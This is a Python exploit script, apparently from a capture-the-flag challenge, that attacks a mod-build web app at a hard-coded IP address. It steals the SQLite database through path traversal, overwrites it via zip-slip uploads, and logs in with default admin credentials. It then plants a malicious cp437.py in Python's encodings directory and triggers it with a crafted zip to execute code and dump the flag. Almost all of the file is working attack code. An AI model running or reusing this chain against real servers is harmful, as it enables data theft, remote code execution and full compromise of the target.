#!/usr/bin/env python3
"""
_t46_db_inject.py — THE BIG PLAN

1. Download /data/db.sqlite3 via /media/../../db.sqlite3
2. Add a Platform with code='lib/python3.11/encodings' (24 chars) to the DB
3. Upload modified DB to overwrite /data/db.sqlite3
4. Use the new platform to create a build
5. Upload zip with cp437.py -> RCE -> dump FLAG
"""
import requests, sys, io, zipfile, secrets, time, re, sqlite3, tempfile, os

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://144.79.188.39:42166"
if not BASE.startswith("http"):
    BASE = "http://" + BASE

def fresh():
    u = "u" + secrets.token_hex(4)
    pw = "Pass12345!"
    requests.post(f"{BASE}/api/auth/register/", json={"username": u, "password": pw}, timeout=15)
    r = requests.post(f"{BASE}/api/auth/login/", json={"username": u, "password": pw}, timeout=15)
    return r.json()["access"], u

def H(tok):
    return {"Authorization": f"Bearer {tok}"}

print(f"[*] Target: {BASE}")

# ====== STEP 1: Download current DB ======
print("\n[1] Downloading DB...")
r_db = requests.get(f"{BASE}/media/../../db.sqlite3", timeout=15)
assert r_db.status_code == 200, f"DB download failed: {r_db.status_code}"
db_bytes = r_db.content
print(f"    DB size: {len(db_bytes)} bytes")
assert db_bytes[:6] == b'SQLite', f"Not a SQLite file: {db_bytes[:20]}"

# ====== STEP 2: Modify DB ======
print("\n[2] Modifying DB...")
tmp = tempfile.mktemp(suffix=".sqlite3")
with open(tmp, "wb") as f:
    f.write(db_bytes)

conn = sqlite3.connect(tmp)
cursor = conn.cursor()

# See what tables exist
cursor.execute("SELECT name FROM sqlite_master WHERE type='table'")
tables = cursor.fetchall()
print(f"    Tables: {[t[0] for t in tables]}")

# Check platforms table
cursor.execute("SELECT * FROM platforms LIMIT 5")
plats = cursor.fetchall()
print(f"    Existing platforms (first 5): {plats}")

# Check platform table schema
cursor.execute("PRAGMA table_info(platforms)")
cols = cursor.fetchall()
print(f"    Platform columns: {[(c[1], c[2]) for c in cols]}")

# Get admin user id
cursor.execute("SELECT id, username FROM accounts_user WHERE is_superuser=1 LIMIT 1")
admin_rows = cursor.fetchall()
print(f"    Admin users: {admin_rows}")
admin_id = admin_rows[0][0] if admin_rows else 1

import datetime
now = datetime.datetime.now().isoformat()

# Insert platform with long code
long_code = "lib/python3.11/encodings"
cursor.execute(
    "INSERT INTO platforms (owner_id, code, name, description, is_enabled, created_at, updated_at) "
    "VALUES (?, ?, ?, ?, ?, ?, ?)",
    (admin_id, long_code, "encodings", "", 1, now, now)
)
new_plat_id = cursor.lastrowid
print(f"    Inserted platform id={new_plat_id} code='{long_code}'")
conn.commit()

# Verify
cursor.execute("SELECT id, code FROM platforms WHERE code=?", (long_code,))
verify = cursor.fetchone()
print(f"    Verify: {verify}")
conn.close()

# Read modified DB
with open(tmp, "rb") as f:
    new_db = f.read()
os.unlink(tmp)
print(f"    New DB size: {len(new_db)} bytes")

# ====== STEP 3: Upload modified DB via zip-slip ======
print("\n[3] Uploading modified DB...")
# Target: /data/db.sqlite3
# storage_dir = /data/media/builds/<mv>/<pc>
# Need storage_dir = /data/
# From /data/media/builds: ../../ = /data/media, ../../../ = /
# Need to reach /data/: from /data/media/builds, go up 2 = /data/, then . 
# mv='../..' (5 chars), pc='' (empty?)
# Or: mv='..', pc='..'  (both 2 chars) -> /data/media/builds/../.. = /data/media
# Hmm that's /data/media not /data/

# Let's trace carefully:
# MEDIA_ROOT = /data/media
# storage_dir = MEDIA_ROOT / 'builds' / mv / pc
# = /data/media/builds/mv/pc
# 
# To write to /data/db.sqlite3:
# storage_dir must be /data/
# /data/media/builds + '../../../' = /  (3 levels)
# /data/media/builds + '../../..' + '/' + '..' = /
# Actually: /data/media/builds = 3 path components
# 1 up: /data/media
# 2 up: /data
# 3 up: /
# 
# So storage_dir = /data requires 2 levels up:
# mv = '../..' (5 chars) -> /data/media/builds/../.. = /data/media
# Wait, no: /data/media/builds + /../.. = /data/media (2 levels from builds)
# But we need to get to /data/ which is 1 more level from /data/media
# 
# /data/media/builds + /../../.. = /
# We need exactly 2 levels: go to /data/ from builds
# builds is child of media, media is child of data
# From builds: ../ = media, ../../ = data, ../../../ = /
# So 2 dots (../../) from builds = /data/ !!

from pathlib import PurePosixPath
base = PurePosixPath('/data/media/builds')
test = base / '../..'
print(f"    base/'../../' = {test}")
# /data/media/builds/../.. = /data/media (2 components of builds path go up)
# /data/media/builds = starts at builds
# ../= /data/media
# ../../= /data
# WAIT: I keep confusing myself. Let me count COMPONENTS:
# /data/media/builds has components: ['data', 'media', 'builds']
# Going up:
# 1x .. -> ['data', 'media'] = /data/media
# 2x .. -> ['data'] = /data  ✓
# 3x .. -> [] = /

# So: mv='..' (1 dot, 2 chars) from builds -> /data/media
# mv='../..' or mv='..', pc='..' -> builds + .. / .. -> ? 
# storage_dir = /data/media/builds + mv + pc
# If mv='..', pc='..' -> /data/media/builds/../.. = 
#   /data/media/builds/.. = /data/media then /.. = /data  !!!
# YES! mv='..' (2 chars) + pc='..' (2 chars) -> storage_dir = /data/

test2 = PurePosixPath('/data/media/builds') / '..' / '..'
print(f"    base/'..'/'..': {test2}")
# This should give /data/media/builds/../.. = /data

tok_db, _ = fresh()
pid_db = None
# Get or create platform with code='..'
r_plats = requests.get(f"{BASE}/api/platforms/", headers=H(tok_db), timeout=15).json()
for p in (r_plats.get("results", r_plats) if isinstance(r_plats, dict) else r_plats) or []:
    if isinstance(p, dict) and p.get("code") == "..":
        pid_db = p["id"]
if not pid_db:
    rp = requests.post(f"{BASE}/api/platforms/", headers=H(tok_db),
        json={"code": "..", "name": "dotdot"}, timeout=15)
    pid_db = rp.json().get("id")
print(f"    Platform '..' id={pid_db}")

mid_db = requests.post(f"{BASE}/api/mods/", headers=H(tok_db),
    json={"title":"z","mod_version":"..","release_notes":"","is_enabled":True}, timeout=15).json().get("id")
print(f"    Mod mv='..' id={mid_db}")

bid_db = requests.post(f"{BASE}/api/mods/{mid_db}/builds/", headers=H(tok_db),
    json={"platform": pid_db}, timeout=15).json().get("id")
print(f"    Build id={bid_db}")

bio_db = io.BytesIO()
with zipfile.ZipFile(bio_db, "w", zipfile.ZIP_DEFLATED) as zf:
    zf.writestr("db.sqlite3", new_db)
bio_db.seek(0)
r_upload_db = requests.post(f"{BASE}/api/mods/{mid_db}/builds/{bid_db}/upload/",
    headers=H(tok_db), files={"zip_file": ("db.zip", bio_db, "application/zip")}, timeout=30)
print(f"    Upload DB -> {r_upload_db.status_code}")
if r_upload_db.status_code != 200:
    print(f"    Error: {r_upload_db.text[:200]}")

# ====== STEP 4: Verify DB is updated ======
print("\n[4] Verifying DB update...")
time.sleep(1)
r_verify = requests.get(f"{BASE}/media/../../db.sqlite3", timeout=15)
print(f"    Download new DB: {r_verify.status_code}, size={len(r_verify.content)}")
if r_verify.status_code == 200:
    tmp2 = tempfile.mktemp(suffix=".sqlite3")
    with open(tmp2, "wb") as f:
        f.write(r_verify.content)
    try:
        conn2 = sqlite3.connect(tmp2)
        c2 = conn2.cursor()
        c2.execute("SELECT id, code FROM platforms ORDER BY id DESC LIMIT 5")
        print(f"    Latest platforms: {c2.fetchall()}")
        conn2.close()
    except Exception as e:
        print(f"    DB read error: {e}")
    finally:
        os.unlink(tmp2)

# ====== STEP 5: Use new platform to upload cp437.py ======
print("\n[5] Uploading cp437.py via new platform...")
# Now the platform with id=new_plat_id and code='lib/python3.11/encodings' should exist
# But we need to authenticate and create a build using that platform
# The admin user already has it

OUT = "flag_" + secrets.token_hex(4) + ".txt"
SHIM = f"""import os as _o
try:
    open('/usr/share/nginx/html/{OUT}','w').write(_o.environ.get('FLAG','NOFLAG')+'\\n')
except Exception: pass
try:
    open('/data/media/{OUT}','w').write(_o.environ.get('FLAG','NOFLAG')+'\\n')
except Exception: pass
"""
print(f"    OUT={OUT}")

# Login as admin to use the new platform
tok_admin = requests.post(f"{BASE}/api/auth/login/",
    json={"username":"palforge_admin","password":"change-me-admin"}, timeout=15).json().get("access")
print(f"    Admin token: {tok_admin[:20] if tok_admin else 'FAIL'}")

# List platforms to find the new one
r_plats2 = requests.get(f"{BASE}/api/platforms/", headers=H(tok_admin), timeout=15).json()
plat_results = r_plats2.get("results", r_plats2) if isinstance(r_plats2, dict) else r_plats2
target_plat = None
for p in (plat_results or []):
    if isinstance(p, dict) and p.get("code") == "lib/python3.11/encodings":
        target_plat = p
        print(f"    Found target platform: id={p['id']} code='{p['code']}'")
        break

if not target_plat:
    print("    [-] Target platform not found! DB overwrite may not have worked.")
    # Try creating anyway
    rp = requests.post(f"{BASE}/api/platforms/", headers=H(tok_admin),
        json={"code": "lib/python3.11/encodings", "name": "enc"}, timeout=15)
    print(f"    Try create long-code platform: {rp.status_code} {rp.text[:100]}")
else:
    pid_enc = target_plat["id"]
    # Create mod and build
    mid_enc = requests.post(f"{BASE}/api/mods/", headers=H(tok_admin),
        json={"title":"z","mod_version":"../../../usr/local","release_notes":"","is_enabled":True}, timeout=15).json().get("id")
    print(f"    Mod (usr/local) id={mid_enc}")
    if mid_enc:
        bid_enc = requests.post(f"{BASE}/api/mods/{mid_enc}/builds/", headers=H(tok_admin),
            json={"platform": pid_enc}, timeout=15).json().get("id")
        print(f"    Build id={bid_enc}")
        if bid_enc:
            bio_shim = io.BytesIO()
            with zipfile.ZipFile(bio_shim, "w", zipfile.ZIP_DEFLATED) as zf:
                zf.writestr("cp437.py", SHIM.encode())
            bio_shim.seek(0)
            r_shim = requests.post(f"{BASE}/api/mods/{mid_enc}/builds/{bid_enc}/upload/",
                headers=H(tok_admin), files={"zip_file": ("cp437.zip", bio_shim, "application/zip")}, timeout=30)
            print(f"    Upload cp437.py to /usr/local/lib/python3.11/encodings/ -> {r_shim.status_code}")

# ====== STEP 6: Trigger cp437 codec ======
print("\n[6] Triggering cp437 import...")
tok_trig, _ = fresh()
pid_trig = None
r_p = requests.get(f"{BASE}/api/platforms/", headers=H(tok_trig), timeout=15).json()
for p in (r_p.get("results", r_p) if isinstance(r_p, dict) else r_p) or []:
    if isinstance(p, dict) and p.get("code") == "trigger":
        pid_trig = p["id"]
if not pid_trig:
    pid_trig = requests.post(f"{BASE}/api/platforms/", headers=H(tok_trig),
        json={"code": "triggr2", "name": "t"}, timeout=15).json().get("id")

mid_trig = requests.post(f"{BASE}/api/mods/", headers=H(tok_trig),
    json={"title":"z","mod_version":"vt2","release_notes":"","is_enabled":True}, timeout=15).json().get("id")
bid_trig = requests.post(f"{BASE}/api/mods/{mid_trig}/builds/", headers=H(tok_trig),
    json={"platform": pid_trig}, timeout=15).json().get("id")

# Upload zip with ASCII filename, no UTF-8 flag -> triggers cp437 codec
import struct, zlib as zl

def make_legacy_zip(filename_ascii: bytes, content: bytes) -> bytes:
    now = time.localtime()
    dt = (now.tm_year - 1980) << 9 | now.tm_mon << 5 | now.tm_mday
    tm = now.tm_hour << 11 | now.tm_min << 5 | now.tm_sec // 2
    compressed = zl.compress(content)[2:-4]
    crc = zl.crc32(content)
    lfh = struct.pack('<4s2B4HL2L2H',
        b'PK\x03\x04', 20, 0, 0, 8, tm, dt, crc,
        len(compressed), len(content), len(filename_ascii), 0)
    local = lfh + filename_ascii + compressed
    offset = 0
    cdr = struct.pack('<4s4B4HL2L5H2L',
        b'PK\x01\x02', 20, 0, 20, 0, 0, 8, tm, dt, crc,
        len(compressed), len(content), len(filename_ascii), 0, 0, 0, 0, 0, offset)
    cdr += filename_ascii
    eocd = struct.pack('<4s4H2LH', b'PK\x05\x06', 0, 0, 1, 1, len(cdr), len(local), 0)
    return local + cdr + eocd

legacy_zip = make_legacy_zip(b"hello.txt", b"trigger cp437 codec lookup")
bio_trig = io.BytesIO(legacy_zip)
r_trig = requests.post(f"{BASE}/api/mods/{mid_trig}/builds/{bid_trig}/upload/",
    headers=H(tok_trig), files={"zip_file": ("trig.zip", bio_trig, "application/zip")}, timeout=30)
print(f"    Legacy zip upload -> {r_trig.status_code}")

time.sleep(2)
print(f"\n[7] Checking {OUT}...")
for url, label in [(f"{BASE}/{OUT}", "nginx"), (f"{BASE}/media/{OUT}", "media")]:
    r = requests.get(url, timeout=10)
    if r.status_code == 200:
        m = re.search(r"PTITCTF\{[^}]+\}", r.text)
        print(f"  {label}: {r.text[:120]}")
        if m:
            print(f"\n>>> FLAG: {m.group(0)}")
    else:
        print(f"  {label}: {r.status_code}")
